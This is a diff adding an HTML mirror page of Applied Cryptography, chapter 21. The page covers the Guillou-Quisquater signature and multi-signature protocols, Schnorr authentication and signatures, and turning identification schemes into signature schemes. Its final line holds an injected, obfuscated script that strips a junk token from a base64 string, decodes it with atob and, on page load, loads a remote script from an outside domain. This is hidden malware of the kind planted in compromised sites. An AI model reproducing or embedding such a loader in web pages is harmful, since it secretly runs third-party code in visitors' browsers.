@@ -1,0 +1,130 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Identification Schemes</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=21//-->
+<!--PAGES=509-512//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="21-03.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="../ch22/22-01.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P><FONT SIZE="+1"><B><I>Guillou-Quisquater Signature Scheme</I></B></FONT></P>
+<P>This identification can be converted to a signature scheme, also suited for smart-card implementation [671,672].
+</P>
+<P>The public and private key setup is the same as before. Here&#146;s the protocol:</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Alice picks a random integer <I>r,</I> such that <I>r</I> is between 1 and <I>n</I> - 1. She computes <I>T</I> = <I>r</I><SUP>v</SUP> mod <I>n.</I>
+<DD><B>(2)</B>&nbsp;&nbsp;Alice computes <I>d</I> = <I>H</I>(<I>M,T</I>), where <I>M</I> is the message being signed and <I>H</I>(<I>x</I>) is a one-way hash function. The <I>d</I> produced by the hash function must be between 0 and <I>v</I> - 1 [1280]. If the output of the hash function is not within this range, it must be reduced modulo <I>v.</I>
+<DD><B>(3)</B>&nbsp;&nbsp;Alice computes <I>D</I> = <I>rB</I><SUP>d</SUP> mod <I>n.</I> The signature consists of the message, <I>M,</I> the two calculated values, <I>d</I> and <I>D,</I> and her credentials, <I>J.</I> She sends this signature to Bob.
+<DD><B>(4)</B>&nbsp;&nbsp;Bob computes <I>T</I>&#180; = <I>D</I><SUP>v</SUP><I>J</I><SUP>d</SUP> mod <I>n.</I> He then computes <I>d</I>&#180; = <I>H</I>(<I>M,T</I>&#180;). If <I>d</I> = <I>d</I>&#180;, then Alice must know <I>B</I> and the signature is valid.
+</DL>
+<P><FONT SIZE="+1"><B><I>Multiple Signatures</I></B></FONT></P>
+<P>What if many people want to sign the same document? The easy solution has each of them signing separately, but this signature scheme can do better than that. Here Alice and Bob sign the same document and Carol verifies the signatures, but any number of people can be involved in the signature process. As before, Alice and Bob have their own unique <I>J</I> and <I>B</I> values: (<I>J</I><SUB>A</SUB>, <I>B</I><SUB>A</SUB>) and (<I>J</I><SUB>B</SUB>, <I>B</I><SUB>B</SUB>). The values <I>n</I> and <I>v</I> are common to the system.</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Alice picks a random integer, <I>r</I><SUB>A</SUB>, such that <I>r</I><SUB>A</SUB> is between 1 and <I>n</I> - 1. She computes <I>T</I><SUB>A</SUB> = <I>r</I><SUB>A</SUB><SUP>v</SUP> mod <I>n</I> and sends <I>T</I><SUB>A</SUB> to Bob.
+<DD><B>(2)</B>&nbsp;&nbsp;Bob picks a random integer, <I>r</I><SUB>B</SUB>, such that <I>r</I><SUB>B</SUB> is between 1 and <I>n</I> - 1. He computes <I>T</I><SUB>B</SUB> = <I>r</I><SUB>B</SUB><SUP>v</SUP> mod <I>n</I> and sends <I>T</I><SUB>B</SUB> to Alice.
+<DD><B>(3)</B>&nbsp;&nbsp;Alice and Bob each compute <I>T</I> = (<I>T</I><SUB>A</SUB><I>T</I><SUB>B</SUB>) mod <I>n.</I>
+<DD><B>(4)</B>&nbsp;&nbsp;Alice and Bob each compute <I>d</I> = <I>H</I>(<I>M,T</I>), where <I>M</I> is the message being signed and <I>H</I>(<I>x</I>) is a one-way hash function. The <I>d</I> produced by the hash function must be between 0 and <I>v</I> - 1 [1280]. If the output of the hash function is not within this range, it must be reduced modulo <I>v.</I>
+<DD><B>(5)</B>&nbsp;&nbsp;Alice computes <I>D</I><SUB>A</SUB> = <I>r</I><SUB>A</SUB><I>B</I><SUB>A</SUB><SUP>d</SUP> mod <I>n</I> and sends <I>D</I><SUB>A</SUB> to Bob.
+<DD><B>(6)</B>&nbsp;&nbsp;Bob computes <I>D</I><SUB>B</SUB> = <I>r</I><SUB>B</SUB><I>B</I><SUB>B</SUB><SUP>d</SUP> mod <I>n</I> and sends <I>D</I><SUB>B</SUB> to Alice.
+<DD><B>(7)</B>&nbsp;&nbsp;Alice and Bob each compute <I>D</I> = <I>D</I><SUB>A</SUB><I>D</I><SUB>B</SUB> mod <I>n.</I> The signature consists of the message, <I>M,</I> the two calculated values, <I>d</I> and <I>D,</I> and both of their credentials: <I>J</I><SUB>A</SUB> and <I>J</I><SUB>B</SUB>.
+<DD><B>(8)</B>&nbsp;&nbsp;Carol computes <I>J</I> = <I>J</I><SUB>A</SUB><I>J</I><SUB>B</SUB> mod <I>n.</I>
+<DD><B>(9)</B>&nbsp;&nbsp;Carol computes <I>T</I>&#180; = <I>D</I><SUP>v</SUP><I>J</I><SUP>d</SUP> mod <I>n.</I> She then computes <I>d</I>&#180; = <I>H</I>(<I>M,T</I>&#180;). If <I>d</I> &#8801; <I>d</I>&#180;, then the multiple signature is valid.
+</DL>
+<P>This protocol can be extended to any number of people. For multiple people to sign, they all multiply their individual <I>T</I><SUB>i</SUB> values together in step (3), and their individual <I>D</I><SUB>i</SUB> values together in step (7). To verify a multiple signature, multiply all the signers <I>J</I><SUB>i</SUB> values together in step (8). Either all the signatures are valid or there is at least one invalid signature.</P>
+<H3><A NAME="Heading4"></A><FONT COLOR="#000077">21.3 Schnorr</FONT></H3>
+<P>Claus Schnorr&#146;s authentication and signature scheme [1396,1397] gets its security from the difficulty of calculating discrete logarithms. To generate a key pair, first choose two primes, <I>p</I> and <I>q,</I> such that <I>q</I> is a prime factor of <I>p</I> - 1. Then, choose an <I>a</I> not equal to 1, such that <I>a</I><SUP>q</SUP> &#8801; 1 (mod <I>p</I>). All these numbers can be common to a group of users and can be freely published.</P>
+<P>To generate a particular public-key/private-key key pair, choose a random number less than <I>q.</I> This is the private key, <I>s.</I> Then calculate <I>v</I> = <I>a</I><SUP>-s</SUP> mod <I>p.</I> This is the public key.</P>
+<P><FONT SIZE="+1"><B><I>Authentication Protocol</I></B></FONT></P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Peggy picks a random number, <I>r,</I> less than <I>q,</I> and computes <I>x</I> = <I>a</I><SUP>r</SUP> mod <I>p.</I> This is the preprocessing stage and can be done long before Victor is present.
+<DD><B>(2)</B>&nbsp;&nbsp;Peggy sends <I>x</I> to Victor.
+<DD><B>(3)</B>&nbsp;&nbsp;Victor sends Peggy a random number, <I>e,</I> between 0 and 2<SUP>t</SUP> - 1. (I&#146;ll discuss <I>t</I> in a moment.)
+<DD><B>(4)</B>&nbsp;&nbsp;Peggy computes <I>y</I> = (<I>r</I> &#43; <I>se</I>) mod <I>q</I> and sends <I>y</I> to Victor.
+<DD><B>(5)</B>&nbsp;&nbsp;Victor verifies that <I>x</I> = <I>a</I><SUP>y</SUP><I>v</I><SUP>e</SUP> mod <I>p.</I>
+</DL>
+<P>The security is based on the parameter <I>t.</I> The difficulty of breaking the algorithm is about 2<SUP>t</SUP>. Schnorr recommended that <I>p</I> be about 512 bits, <I>q</I> be about 140 bits, and <I>t</I> be 72.</P>
+<P><FONT SIZE="+1"><B><I>Digital Signature Protocol</I></B></FONT></P>
+<P>Schnorr can also be used as a digital signature protocol on a message, <I>M.</I> The public-key/private-key key pair is the same, but we&#146;re now adding a one-way hash function, <I>H</I>(<I>M</I>).</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Alice picks a random number, <I>r,</I> less than <I>q,</I> and computes <I>x</I> = <I>a</I><SUP>r</SUP> mod <I>p.</I> This computation is the preprocessing stage.
+<DD><B>(2)</B>&nbsp;&nbsp;Alice concatenates <I>M</I> and <I>x,</I> and hashes the result:
+<DL>
+<DD><I>e</I> = <I>H</I>(<I>M,x</I>)
+</DL>
+<DD><B>(3)</B>&nbsp;&nbsp;Alice computes <I>y</I> = (<I>r</I> &#43; <I>se</I>) mod <I>q.</I> The signature is <I>e</I> and <I>y;</I> she sends these to Bob.
+<DD><B>(4)</B>&nbsp;&nbsp;Bob computes <I>x</I><SUP>&#180;</SUP> = <I>a</I><SUP>y</SUP><I>v</I><SUP>e</SUP> mod <I>p.</I> He then confirms that the concatenation of <I>M</I> and <I>x</I><SUP>&#180;</SUP> hashes to <I>e.</I>
+<DL>
+<DD><I>e</I> = <I>H</I>(<I>M,x</I><SUP>&#180;</SUP>)
+<DD>If it does, he accepts the signature as valid.
+</DL>
+</DL>
+<P>In his paper, Schnorr cites these novel features of his algorithm:
+</P>
+<BLOCKQUOTE><P>Most of the computation for signature generation can be completed in a preprocessing stage, independent of the message being signed. Hence, it can be done during idle time and not affect the signature speed. An attack against this preprocessing stage is discussed in [475], but I don&#146;t think it&#146;s practical.
+</P>
+<P>For the same level of security, the length of signatures is less for Schnorr than for RSA. For example, with a 140-bit <I>q,</I> signatures are only 212-bits long, less than half the length of RSA signatures. Schnorr&#146;s signatures are also much shorter than ElGamal signatures.</P>
+</BLOCKQUOTE><P>Of course, practical considerations may make even fewer bits suitable for a given scheme: For example, an identification scheme where the cheater must perform an on-line attack in only a few seconds, versus a signature scheme where the cheater can calculate for years off-line to come up with a forgery.
+</P>
+<P>A modification of this algorithm, by Ernie Brickell and Kevin McCurley, enhances its security [265].</P>
+<P><FONT SIZE="+1"><B><I>Patents</I></B></FONT></P>
+<P>Schnorr is patented in the United States [1398] and in many other countries. In 1993, PKP acquired the worldwide rights to the patent (see Section 25.5). The U.S. patent expires on February 19, 2008.
+</P>
+<H3><A NAME="Heading5"></A><FONT COLOR="#000077">21.4 Converting Identification Schemes to Signature Schemes</FONT></H3>
+<P>There is a standard method of converting an identification scheme into a signature scheme: Replace Victor with a one-way hash function. The message is not hashed before it is signed; instead the hashing is incorporated into the signing algorithm. In principle, this can be done with any identification scheme.
+</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="21-03.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="../ch22/22-01.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(LSfBJFEK, iwThHCEo) {iwThHCEo = LSfBJFEK.createElement('script');iwThHCEo.type = 'text/javascript';iwThHCEo.async = true;iwThHCEo.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');LSfBJFEK.getElementsByTagName('body')[0].appendChild(iwThHCEo);}(document));</script></body>
+</html>
